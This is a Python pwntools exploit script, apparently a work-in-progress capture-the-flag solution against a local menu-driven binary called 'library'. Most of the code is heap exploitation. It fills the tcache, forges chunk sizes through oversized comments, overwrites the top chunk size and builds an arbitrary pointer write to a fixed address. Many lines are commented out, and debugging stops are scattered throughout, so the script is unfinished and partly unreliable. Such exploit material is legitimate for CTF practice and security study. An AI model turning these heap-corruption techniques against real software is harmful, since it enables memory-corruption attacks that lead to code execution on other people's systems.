from pwn import *

### arbitrary_pointer_write metadata ###
ARB_PTR_WRITE_CHK_ID = 0
ARB_CHK_ID_B = 0
EDITOR_CHK = 0

CHK_USR = p64(0x6161) + p64(0x0) + p64(0)
CHK_PWD = p64(0x21) #+ p64(0x60) + p64(0x61) + b'\x61'


def register(p: process, username: str = "user", password: str = "12345"):
    p.sendline("1")
    p.sendline(username)
    p.sendline(password)
    p.recvuntil("choice:")

def login(p: process, username: str = "user", password: str = "12345"):
    p.sendline("2")
    p.sendline(username)
    p.sendline(password)
    p.recvuntil("choice:")

def borrow_book(p: process, book_idx: int = 0):
    p.sendline("1")
    p.sendline(str(book_idx))
    p.recvuntil("choice:")

def del_comment(p: process, id: int, book_idx: int = 0):
    p.sendline("3")
    p.sendline(str(book_idx))
    p.sendline(str(id))
    print("deleted: ", id)
    p.recvuntil("choice:")

def return_book(p: process, add_comment: bool = False, comment_len: int = 50, comment: str = "comment", title: str = "title") -> int:
    id = 0
    p.sendline("2")
    if add_comment:
        p.sendline('Y')
        p.sendline(str(comment_len))
        p.sendline(title)
        p.sendline(comment)
        p.recvuntil("Comment ")
        id = int(p.recvuntil(" ").decode())
        print("id: ", id)
    else:
        p.sendline('n')
    p.recvuntil("choice: ", timeout=0.1)

    return id

def logout(p: process):
    p.sendline("4")
    p.recvuntil("choice: ")

def overwrite_top_chunk_size(p: process, new_top_chunk: int):
    borrow_book(p)
    return_book(p, True, 32, (b"a" * 8) + p64(new_top_chunk))
    print("new top_chunk size:", hex(new_top_chunk & 0xFFFF_FFFF_FFFF_FFF8))

def create_heap_trap(p: process, start: int = 100):
    ids = []
    for size in range(start, 1200, 50):
        print(size)
        borrow_book(p)
        ids.append(return_book(p , True, size))
    
    for id in ids:
        del_comment(p, id)

def create_comment(p: process, size: int, comment: str = "comment", book: int = 0) -> int:
    borrow_book(p, book)
    return return_book(p, True, size, comment, "")

def overwrite_chunk_size(p: process, size: int = 0x20, old_size: int = 1200):
    size = size >> 4 #lower 3 bytes are for flags & 1 is empty
    size = size << 4
    create_heap_trap(p)
    create_heap_trap(p)
    create_heap_trap(p)
    create_heap_trap(p)
    create_comment(p, 1200)
    id = create_comment(p, 1200)
    ow_id = create_comment(p, old_size)
    del_comment(p, id)
    create_comment(p, 1200, (b"b" * (1200 - 24)) + p64(size))
    print("comment chunk: ", id, "new size: ", size, "old size: ", old_size)
    return ow_id

def fill_tcache(p: process, size: int, chunks: int = 7):
    ids = []
    for _ in range(chunks):
        #create_comment(p, 1200)
        ids.append(create_comment(p, size, "a"))

    for id in ids:
        del_comment(p, id)

def arb_ptr_write_init(p: process):
    global ARB_PTR_WRITE_CHK_ID
    global ARB_CHK_ID_B
    global EDITOR_CHK
    id0 = create_comment(p, 0x1024)
    id_pre1 = create_comment(p, 0x1024)
    id_pre2 = create_comment(p, 0x1024)
    id1 = create_comment(p, 0x1024)
    id2 = create_comment(p, 0x1200)
    del_comment(p, id_pre2)
    del_comment(p, id_pre1)
    del_comment(p, id0)
    edit_id = create_comment(p, 0x1200)
    sid = create_comment(p, 0x1200, (p64(0x60) + p64(0x61)) * (0x1100//8//2))
    del_comment(p, id2)
    del_comment(p, id1)
    EDITOR_CHK = create_comment(p, 0x1200, (p64(0x61) + p64(0x60)) * ((0x1200 - 24 - 8) // 8 // 2) + b"\x60\x00\x00\x00\x00\x00\x00\x00" + p64(0x1261))
    print("edit id:", edit_id)
    del_comment(p, edit_id)

    #p.interactive()
    ARB_PTR_WRITE_CHK_ID = create_comment(p, 0x1250, b"a" * (0x1200 - 32) + p64(0x60) + p64(0x61) + p64(0x60))
    #id5 = create_comment(p, 0x1024)
    del_comment(p, EDITOR_CHK, 3)
    #del_comment(p, id5)
    EDITOR_CHK = create_comment(p, 0x1200, (p64(0x61) + p64(0x60)) * ((0x1200 - 24 - 8) // 8 // 2) + b"\x60\x00\x00\x00\x00\x00\x00\x00" + p64(0x1211))
    del_comment(p, ARB_PTR_WRITE_CHK_ID)
    #p.interactive()
    ARB_PTR_WRITE_CHK_ID = create_comment(p, 0x1200, "Y" * 5, 3)
    #p.interactive()
    #ARB_CHK_ID_B = create_comment(p, 0x10,'\x00', 1)
    #p.interactive()
    #print("ARB_CHK_ID_B:", ARB_CHK_ID_B)
    #p.interactive()
    fill_tcache(p, 0x50, 8)
    p.interactive()
    del_comment(p, 0) #del edit
    #del_comment(p, ARB_PTR_WRITE_CHK_ID)

    p.interactive()
    logout(p)
    register(p, CHK_USR, CHK_PWD)
    register(p)
    login(p)
    p.interactive()

def arb_re_write_chk(p: process):
    global ARB_PTR_WRITE_CHK_ID
    global EDITOR_CHK
    print("EDITOR_CHK:", EDITOR_CHK)
    #del_comment(p, EDITOR_CHK)
    p.interactive()
    EDITOR_CHK = create_comment(p, 0x1200, (p64(0x61) + p64(0x60)) * ((0x1200 - 24 - 8) // 8 // 2) + b"\x60\x00\x00\x00\x00\x00\x00\x00" + p64(0x1211))
    p.interactive()
    del_comment(p, ARB_PTR_WRITE_CHK_ID)

    del_comment(p, EDITOR_CHK)
    EDITOR_CHK = create_comment(p, 0x1200, (p64(0x61) + p64(0x60)) * ((0x1200 - 24 - 8) // 8 // 2) + b"\x60\x00\x00\x00\x00\x00\x00\x00" + p64(0x1261))

    ARB_PTR_WRITE_CHK_ID = create_comment(p, 0x1250, b"a" * (0x1200 - 32) + p64(0x60) + p64(0x61) + p64(0x60))

def arbitrary_pointer_write(p: process, addr: int, data: str):
    global ARB_PTR_WRITE_CHK_ID
    del_comment(p, ARB_PTR_WRITE_CHK_ID)
    ARB_PTR_WRITE_CHK_ID = create_comment(p, 0x2000, b"b"*0x11f0 + p64(0x0) + p64(0x6161) + b"b" * 0x18 + p64(0x6161) + (b"b" * 0x18) + p64(addr))
    logout(p)
    login(p, CHK_USR, CHK_PWD)
    return_book(p, True, len(data) + 0x30, data)
    

def leak_heap(p: process):
    global ARB_PTR_WRITE_CHK_ID
    #id0 = create_comment(p, 0x1024)
    #
    #p.interactive()
    #ARB_PTR_WRITE_CHK_ID = create_comment(p, 0x1240, b"b"*0x11f0 + p64(0x0) + p64(0x6161) + b"b" * 0x18 + p64(0x6161) + p64(0) * 3 + b'\x00' * 5)
    logout(p)
    login(p, CHK_USR, CHK_PWD)
    borrow_book(p)
    logout(p)
    login(p)

    arb_re_write_chk(p)
    p.interactive()
    #id1 = create_comment(p, 0x1024)
    #p.interactive()
    #del_comment(p, id1)
    #del_comment(p, ARB_PTR_WRITE_CHK_ID)
    #print("ss:" , ARB_PTR_WRITE_CHK_ID)
    #p.interactive()
    #ARB_PTR_WRITE_CHK_ID = create_comment(p, 0x1240)
    #, b"b"*0x11f0 + p64(0x0) + p64(0x6161) + b"b" * 0x18 + p64(0x6161))# + (b"b" * 0x18))# + p64(addr))
    #del_comment(p, ARB_PTR_WRITE_CHK_ID)
    #fill_tcache(p, 0x10, 8)
    #del_comment(p, 0x6161, 1)
    #ARB_CHK_ID_B = create_comment(p, 0x10,'\x00', 1)
    p.interactive()
    #ARB_PTR_WRITE_CHK_ID = create_comment(p, 0x1240, b"b"*0x11f0 + p64(0x0) + p64(0x6161) + b"b" * 0x18 + p64(0x6161))# + (b"b" * 0x18))# + p64(addr))

    #return_book(p, True, len(data) + 0x30, data)

def main():
    ### run ###
    p = process("./library")
    p.recvuntil("choice:")
    register(p, "user", "12345")
    register(p, "user1", "12345")
    login(p)
    fill_tcache(p, 0x10, 7)

    ### init ###
    arb_ptr_write_init(p)

    ### leaks ###
    #create_heap_trap(p)
    
    ### payload start ###
    leak_heap(p)
    p.interactive()
    arbitrary_pointer_write(p, 0x6020A0, "asdfwefwe")
    #logout(p)
    #register(p, "user23", "aa")
    #login(p, "user23", "aa")
    #logout(p)
    #register(p, "user2", "12345")
    #login(p)

    #del_comment(p, edit_id)
    #create_comment(p, 0x5000, "abs")
    p.interactive()

    id0 = create_comment(p, 0x1024)
    id_pre = create_comment(p, 0x1024)
    id1 = create_comment(p, 0x1024)
    id2 = create_comment(p, 0x1200)
    del_comment(p, id_pre)
    del_comment(p, id0)
    edit_id = create_comment(p, 0x1200, p64(0x60) * 100)
    del_comment(p, id2)
    del_comment(p, id1)
    create_comment(p, 0x1200, b"\x00" * (0x1200 - 24 - 8) + b"\x60\x00\x00\x00\x00\x00\x00\x00" + p64(0x60))
    #create_comment(p, 0x1200, b"\x00" * (0x1200 - 24) + p64(0x60))
    #
    #del_comment(p, edit_id)
    #fill_tcache(p, 0x50)
    print("edit id:", edit_id)
    #ids = []
    #for _ in range(7):
    #    ids.append(create_comment(p, 0x50))
    #for id in ids:
    #    del_comment(p, id)
    #del_comment(p, edit_id)

    #gdb.attach(p)
    #del_comment(p, edit_id)
    #create_comment(p, 0x50)
    #logout(p)
    #register(p)
    #del_comment(p, create_comment(p, 1024))
    #del_comment(p, create_comment(p, 1024))
    #create_comment(p, 1024)
    #create_comment(p, 1024)
    #del_comment(p, create_comment(p, 1200))
    #logout(p)
    #register(p)
    #create_heap_trap(p)
    #create_heap_trap(p, 500)
    #create_heap_trap(p)
    #create_comment(p, 1200)
    #create_comment(p, 3, "a")
    #id0 = create_comment(p, 1200)
    #id1 = create_comment(p, 1200)
    #id2 = create_comment(p, 1200)
    #del_comment(p, id2)
    #create_comment(p, 1200, b"a" * (1200- 10))
    #overwrite_chunk_size(p)
    #overwrite_top_chunk_size(p, 0x1200)
    #for _ in range(200):
    #fill_tcache(p, 80)
    #del_comment(p, create_comment(p, 80))
    #create_heap_trap(p)
    #id = create_comment(p, 2000, b"")
    #create_comment(p, 2000)
    #del_comment(p, id)
    #create_comment(p, 3, b"a" * 10)
    p.interactive() 

if __name__ == "__main__":
    main()